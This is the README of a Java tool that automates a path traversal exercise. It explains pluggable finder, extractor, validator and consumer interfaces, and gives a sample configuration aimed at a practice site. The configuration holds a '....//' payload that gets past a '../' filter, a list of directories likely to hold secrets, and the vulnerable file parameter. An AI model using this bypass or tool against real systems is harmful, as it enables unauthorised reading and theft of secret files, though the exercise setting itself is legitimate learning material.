# anya-secret
This tool is a generalization of my exercise on path traversal attacks. To use it, you first need
to have knowledge of this type of attack. Then, simply explore the example configuration below.

In case the program does not perfectly fit your specific case, you can plug in your own 
implementation of one or more of the following interfaces:

- SecretExtractor: given content of a html file, extract the secret.

- SecretValidator: to validate the secret extracted by the extractor.

- SecretFinder: given enough info to request the potential vulnerable pages,
  use the extractor and validator to find secrets in response files.

- SecretConsumer: to consume the secrets found by the finder, e.g. log to file, send to server, etc.

If the above conceptual assumptions are not universal enough, please let me know. I will try to improve them.

## Running the program

Configuration is done in `./config/app.properties`. Below is an example configuration:

```properties
# select SecretFinder implementation and give it a name for config setting
use.finder.type=io.javaside.anyasecret.JseUrlBasedFinder
use.finder.name=myfnd

# configurations specific to JseUrlBasedFinder
finder.myfnd.vulnerable.url=https://hello-anya.fly.dev/
finder.myfnd.secret.decoding.algo=BASE64
    # support either BASE64 or just PLAIN
finder.myfnd.root.backtrack.path=....//
    # to escape the ../ filter for path params
finder.myfnd.potential.secret.dirs=db, app, app/sus, config/hmm, anya/very_secured_secret, bin, config, storage, test, vendor
    # comma seperated list of directories that may contain secret file
finder.myfnd.file.param.key=img
    # key of the param that specify the file to render in vulnerable site
finder.myfnd.secret.file.name=secret_file
    # name of the target secret file

# select SecretExtractor implementation and give it a name for config setting
use.extractor.type=io.javaside.anyasecret.PatternBasedExtractor
use.extractor.name=myext

# configurations specific to PatternBasedExtractor
extractor.myext.extract.regex=data:image\\/[a-zA-Z]+;base64,([a-zA-Z0-9+/=]+)
    # java regex formed with the known of structure of exploited html

# select SecretValidator implementation and give it a name for config setting
use.validator.type=io.javaside.anyasecret.PatternBasedValidator
use.validator.name=myvld

# configurations specific to PatternBasedValidator
validator.myvld.validation.regex=19b.*
    # java regex formed from the hint from anya (my specific exercise context)

# select SecretConsumer implementation and give it a name for config setting
use.consumer.type=io.javaside.anyasecret.LogToFileConsumer
use.consumer.name=mycon

# configurations specific to LogToFileConsumer
consumer.mycon.log.dir=secrets
consumer.mycon.path.flattening=true
    # whether to flatten the path of the secret file
```

This program is tested in java 21 but should work with java 11 or above. 
The command to run the program is:
```code
./gradlew run
```
